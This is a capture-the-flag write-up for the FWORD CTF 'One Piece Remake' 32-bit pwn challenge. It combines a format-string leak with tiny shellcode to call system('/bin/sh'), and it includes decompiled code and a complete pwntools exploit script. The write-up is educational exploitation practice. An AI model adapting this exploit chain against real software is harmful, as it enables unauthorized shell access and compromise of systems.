# FWORD CTF - One Piece Remake [pwn - 487p]

Note, i did not participate in the ctf, so i solved this challenge after the
ctf had ended.

Checksec reveals that its a 32 bit binary with executable stack. We can also
overwrite GOT if needed, as its only partial RELRO.  
```  
[*] '~/ctf/fword/one_piece_remake'  
   Arch:     i386-32-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      No PIE (0x8048000)  
   RWX:      Has RWX segments  
```  
The menu is similar to the one piece challenge, we can read and run shellcode.
However the functionallity of the two are different. This time we are allowed
to read 5 bytes into a buffer using the read function, and we can actually
execute the 5 byte shellcode using the run command.

```c  
void readSC(void)

{  
 puts("Give me your devil-shellcode : ");  
 printf(">>");  
 read(0,&sc,5);  
 return 0;  
}

void runSC(void)

{  
__x86.get_pc_thunk.ax();  
 (*(code *)&sc)();  
 return;  
}  
```

if we look at the source code, we can see that there is a "hidden" option,
*gomugomunomi*, that calls the function *mugiwara*, also similar to the one
piece challenge.  
```c  
     iVar1 = strcmp(local_20,"gomugomunomi\n");  
     if (iVar1 != 0) break;  
     mugiwara();  
```  
The mugiwara function has a standard format string vulnerability that we can
use as a WriteWhatWhere primitive.

The easy way out would be to overwrite for example fgets with system, or a one
gadget to get a shell, but i dont think that is what the author intended.

```c  
void mugiwara(void)

{  
 char local_70 [104];  
  
 puts("what\'s your name pirate ?");  
 printf(">>");  
 read(0,local_70,100);  
 printf(local_70);  
 return 0;  
}  
```

## Exploit plan  
* Leak stack buffer address and write `execve /bin/sh` shellcode to the stack buffer  
* write a `jmp stack buffer` shellcode into the 5 byte shellcode buffer  
* execute shellcode using the `run` option

### Problem  
As the 100 byte buffer is on the stack, most of it gets overwritten when we
return back to the menu, there are only 16 bytes preserved when we get to run
our shellcode. So we cant use the default `shellcode.sh()` from pwntools which
requires more than 16 bytes.  
### Solution  
Leak libc using the format string vuln, and execute `system(/bin/sh)`, as it
only requires 16 bytes. (`push ptr_to_bin_sh_str; push fake_ret_addr; push
pointer_to_system; ret`).

## Solve script  
```python  
#!/usr/bin/env python  
# -*- coding: utf-8 -*-  
# This exploit template was generated via:  
# $ pwn template --host onepiece.fword.wtf --port 1236 ./one_piece_remake  
from pwn import *

# Set up pwntools for the correct architecture  
exe = context.binary = ELF('./one_piece_remake')  
context.terminal = ['tmux', 'splitw', '-h']  
# Many built-in settings can be controlled on the command-line and show up  
# in "args".  For example, to dump all data sent/received, and disable ASLR  
# for all created processes...  
# ./exploit.py DEBUG NOASLR  
# ./exploit.py GDB HOST=example.com PORT=4141  
host = args.HOST or 'onepiece.fword.wtf'  
port = int(args.PORT or 1236)

def local(argv=[], *a, **kw):  
   '''Execute the target binary locally'''  
   if args.GDB:  
       return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)  
   else:  
       return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):  
   '''Connect to the process on the remote host'''  
   io = connect(host, port)  
   if args.GDB:  
       gdb.attach(io, gdbscript=gdbscript)  
   return io

def start(argv=[], *a, **kw):  
   '''Start the exploit against the target.'''  
   if args.LOCAL:  
       return local(argv, *a, **kw)  
   else:  
       return remote(argv, *a, **kw)

# Specify your GDB script here for debugging  
# GDB will be launched if the exploit is run via e.g.  
# ./exploit.py GDB  
gdbscript = '''

b *runSC+22  
continue  
'''.format(**locals())

#===========================================================  
#                    EXPLOIT GOES HERE  
#===========================================================  
libc = ELF('libc6_2.30-0ubuntu2.1_i386.so')  
io = start()  
io.sendline('gomugomunomi')  
io.sendline(b'#%p#%11$p#') # leak buffer and libc address.  
io.recvuntil('#')  
buffer_adr = int(io.recvuntil('#')[:-1], 16)  
log.success('buffer @ {}'.format(hex(buffer_adr)))

libc_leak = int(io.recvuntil('#')[:-1], 16)  
libc.address = libc_leak -0x6fdb1  
log.success('libc base @ {}'.format(hex(libc.address)))  
io.recvuntil('>>')  
io.sendline('read')  
shellcode = "jmp {}".format(hex(buffer_adr)) #shellcode to jump to our buffer  
io.sendline(asm(shellcode,vma=0x804a038))  
io.recvuntil('>>')  
io.sendline('gomugomunomi')  
io.recvuntil('pirate ?')  
shellcode = "push {}; push {}; push {};
ret".format(hex(next(libc.search(b'/bin/sh\x00'))), hex(0xdeadc0de),
hex(libc.sym['system'])) #write our shellcode to the buffer  
io.sendline(asm(shellcode))  
io.recvuntil('>>')  
io.sendline('run') #execute shellcode  
io.recvuntil('>>')  
io.sendline('grep Fword flag.txt') # need to use grep as there is no cat on
the server ¯\_(ツ)_/¯  
io.interactive()  
```

Original writeup
(https://github.com/nordbo/writeups/tree/master/fword-2020/pwn/one_piece_remake).